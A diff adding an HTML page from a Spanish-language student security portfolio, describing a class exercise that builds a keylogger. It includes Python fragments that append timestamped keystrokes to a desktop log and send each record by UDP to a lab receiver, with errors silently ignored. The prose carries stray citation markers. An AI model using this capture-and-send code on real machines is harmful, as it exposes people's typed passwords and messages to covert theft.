@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 03 | CNO IV</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="brand">
+                <span class="logo-icon pulse">🛡️</span>
+                <h2>CNO IV PORTAFOLIO</h2>
+            </div>
+            <nav class="nav-menu">
+                <a href="../index.html"><span class="nav-dot"></span>01. INICIO</a>
+                <a href="index.html" class="active"><span class="nav-dot"></span>02. PARCIAL_1</a>
+                <a href="../parcial2/index.html"><span class="nav-dot"></span>03. PARCIAL_2</a>
+                <a href="../parcial3/index.html"><span class="nav-dot"></span>04. PARCIAL_3</a>
+            </nav>
+            <div class="system-status">
+                <p>STATUS: <span class="text-green blink">SECURE</span></p>
+                <a href="https://t.me/D3im0s" target="_blank" class="telegram-link">> SECURE_COMMS [TELEGRAM]</a>
+            </div>
+        </aside>
+
+        <!-- Contenido Principal -->
+        <main class="main-content">
+            <header class="topbar">
+                <a href="index.html" class="back-btn">< VOLVER A ACTIVIDADES</a>
+                <div class="user-info">
+                    <span>OP: sys_d3im0s</span>
+                </div>
+            </header>
+
+            <div class="grid-container">
+                
+                <!-- 1. Encabezado Académico (Más compacto, sin roleplay) -->
+                <div class="card fade-in span-4" style="animation-delay: 0.1s;">
+                    <div class="card-title">> ACTIVIDAD_03: NO PRESIONES ESC... TODAVÍA</div>
+                    <div class="card-content" style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 15px; padding: 15px 20px;">
+                        <div style="line-height: 1.6;">
+                            <p><strong>Estudiante:</strong> Angel Aaron Acuña Quezada (181583)</p>
+                            <p><strong>Catedrático:</strong> Mtro. Servando López Contreras</p>
+                            <p><strong>Fecha de entrega:</strong> 24 de agosto del 2026</p>
+                        </div>
+                        <div style="text-align: right; border-left: 1px solid var(--border-color); padding-left: 20px; display: flex; flex-direction: column; justify-content: center; align-items: flex-end;">
+                            <p style="color: var(--accent); font-weight: bold; font-size: 1.1rem;">ESTADO: ENTREGADO</p>
+                            <p style="font-size: 0.9rem; opacity: 0.8; margin-bottom: 12px;">Tema: Captura de eventos de teclado</p>
+                            
+                            <!-- BOTÓN DE DESCARGA PDF -->
+                            <a href="../pdf/Act03.pdf" download="Act03.pdf" class="back-btn" style="font-size: 0.85rem; border: 1px solid var(--accent); padding: 5px 12px; background: rgba(0, 168, 89, 0.05);">
+                                [ ↓ ] DESCARGAR PDF
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 2. Introducción -->
+                <div class="card fade-in span-2" style="animation-delay: 0.2s;">
+                    <div class="card-title">1. INTRODUCCIÓN</div>
+                    <div class="card-content">
+                        <p>Comprender las técnicas ofensivas es el primer paso para desarrollar buenas defensas[cite: 2]. En esta práctica, exploramos la anatomía de la captura de datos de entrada mediante la manipulación de event hooks en el sistema operativo[cite: 2]. Este reporte detalla el desarrollo de un script capaz de interceptar eventos de teclado, registrar su actividad con marcas temporales exactas y transmitir esta telemetría hacia un receptor remoto en ParrotOS[cite: 2].</p>
+                    </div>
+                </div>
+
+                <!-- 3. Detalles de la Actividad -->
+                <div class="card fade-in span-2" style="animation-delay: 0.3s;">
+                    <div class="card-title">2. DETALLES DE LA ACTIVIDAD</div>
+                    <div class="card-content">
+                        <ul class="skill-list" style="line-height: 1.8;">
+                            <li>> <strong>Requisitos técnicos:</strong> Persistencia, Asociación temporal, Envío de información[cite: 2].</li>
+                            <li>> <strong>Concepto principal:</strong> Manipulación de event hooks y callbacks[cite: 2].</li>
+                            <li>> <strong>Entorno emisor:</strong> Script local ejecutado en Windows.</li>
+                            <li>> <strong>Entorno receptor:</strong> Máquina virtual con ParrotOS (IP: 192.168.0.28, Puerto: 44444)[cite: 2].</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- 4. Desarrollo Técnico -->
+                <div class="card fade-in span-4" style="animation-delay: 0.4s;">
+                    <div class="card-title">3. DESARROLLO TÉCNICO</div>
+                    <div class="card-content">
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 30px;">
+                            <!-- Fase 1 -->
+                            <div>
+                                <p style="color: var(--text-light); font-weight: bold; margin-bottom: 5px;">A) Persistencia y Asociación</p>
+                                <p style="margin-bottom: 10px; font-size: 0.95rem;">El código crea un archivo local llamado <span style="color: var(--accent);">registro_local.log</span> en el escritorio usando el modo de apertura 'a' (append) para evitar la sobreescritura de datos[cite: 2]. Cada pulsación registrada es acompañada de una marca de tiempo generada por la función ts()[cite: 2].</p>
+                                <pre style="background: #000; padding: 12px; border: 1px solid var(--border-color); color: var(--accent-glow); font-family: monospace; overflow-x: auto; font-size: 0.85rem;">def log(tipo, key):
+    global n
+    t = ts()
+    reg = f"{t} | {tipo} | evento_{n:03d} | {key}\n"
+    n += 1
+    with open(ruta_log, 'a') as f:
+        f.write(reg)
+    send(reg)</pre>
+                            </div>
+                            <!-- Fase 2 -->
+                            <div>
+                                <p style="color: var(--text-light); font-weight: bold; margin-bottom: 5px;">B) Envío de Información</p>
+                                <p style="margin-bottom: 10px; font-size: 0.95rem;">Se configuró la transmisión de datos por red mediante la función send[cite: 2]. Se utiliza un bloque try-except junto con un socket UDP (AF_INET, SOCK_DGRAM) para asegurar que el programa no se interrumpa ante posibles errores de red[cite: 2].</p>
+                                <pre style="background: #000; padding: 12px; border: 1px solid var(--border-color); color: var(--accent-glow); font-family: monospace; overflow-x: auto; font-size: 0.85rem;">def send(data):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(data.encode(), (ip, port))
+    except:
+        pass</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 5. Resultados (Fotos) y Conclusión -->
+                <div class="card fade-in span-4" style="animation-delay: 0.5s;">
+                    <div class="card-title">4. RESULTADOS Y CONCLUSIONES</div>
+                    <div class="card-content">
+                        
+                        <!-- Contenedor de las dos imágenes -->
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 25px;">
+                            <!-- Imagen Windows -->
+                            <div>
+                                <p style="color: var(--accent); font-weight: bold; font-size: 0.9rem; margin-bottom: 8px;">> EJECUCIÓN EN ENTORNO WINDOWS</p>
+                                <img src="../img/captura_windows.png" alt="Captura del script en Windows" style="width: 100%; border: 1px solid var(--border-color); border-radius: 4px;">
+                            </div>
+                            <!-- Imagen Parrot -->
+                            <div>
+                                <p style="color: var(--accent); font-weight: bold; font-size: 0.9rem; margin-bottom: 8px;">> RECEPCIÓN EN PARROT OS</p>
+                                <img src="../img/captura_parrot.png" alt="Captura de terminal en ParrotOS" style="width: 100%; border: 1px solid var(--border-color); border-radius: 4px;">
+                            </div>
+                        </div>
+
+                        <!-- Conclusión Académica -->
+                        <div style="border-top: 1px dashed var(--border-color); padding-top: 20px;">
+                            <p style="color: var(--text-light); margin-bottom: 10px;"><strong>Conclusión:</strong></p>
+                            <p>Con el desarrollo de este script, logramos entender de forma práctica el funcionamiento de un keylogger, observando cómo se capturan los datos y son enviados a través de protocolos de red comunes[cite: 2]. Las vulnerabilidades no siempre residen en fallas de software complejas, sino también en el abuso de funciones nativas del sistema operativo[cite: 2]. Entender esto nos ayuda a preparar una mejor defensa y a ser conscientes de lo que un atacante puede lograr[cite: 2].</p>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+            
+            <footer class="soc-footer fade-in" style="animation-delay: 0.6s; margin-top: 20px;">
+                <p>Donde ellos ven un muro, nosotros vemos una puerta trasera. | © 2026 Angel Acuña | CNO IV</p>
+            </footer>
+        </main>
+    </div>
+    <script src="../js/script.js"></script>
+</body>
+</html>
